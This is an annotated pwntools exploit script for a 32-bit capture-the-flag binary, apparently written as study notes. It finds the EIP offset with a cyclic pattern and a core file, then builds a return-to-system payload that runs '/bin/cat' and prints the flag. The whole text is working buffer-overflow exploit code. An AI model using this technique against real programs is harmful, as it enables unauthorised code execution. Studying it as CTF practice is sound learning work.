Differences from template to 32Bit

# Find system call
system_addr = elf.symbols['system'] # Need to find the system call so that we can run commands
# Find command to run as an arg in system
bincat_addr = next(elf.search(b'/bin/cat')) # Need the string for an argument for the system call

# Addresses
info("%#x system", system_addr) # Printing out the address for verification\
info("%#x /bin/cat", bincat_addr) # Printing out the address for verification

# Find Buffer overflow
payload = cyclic(100) # Need to find buffer overflow

# Send payload
io.sendlineafter("> ", payload) # Send the payload

# Wait for crash
io.wait() # Wait for crash

# Read the crash file
core = io.corefile # Read the core file to see where the EIP is

# Locate EIP value and offset
eip_value = core.eip # Read what is in the EIP register\
eip_offset = cyclic_find(eip_value) # find the offset based off of what was in the register

# Display offset
info("Located EIP at {a}".format(a=eip_offset)) # Print offset

# Build the payload
payload = flat({  
    eip_offset: [elf.symbols.system,
    0x0,
    bincat_addr
    ]
})
# Comments below explain everything
'''\
    eip_offset:             #Offset to cause overflow\
    [elf.symbols.system,    #Command to run\
    0x0,                    #Overwriting return byte\
    bincat_addr             #Command to run's argument\
'''

# Save the payload to file
write('payload', payload) # Save payload for later day

# Start the process again
io = start()  # Start the process again

# Send the payload
io.sendlineafter('> ', payload) # Send new payload\
io.recvuntil('Thank you!\n') # Wait until end

# Or, Get our flag!
flag = io.recvline() # Grab flag

try: # I have issues with success so I just put this to print what it sees\
    success(flag)\
except AttributeError:\
    print("[+] Flag: {}".format(str(flag)))
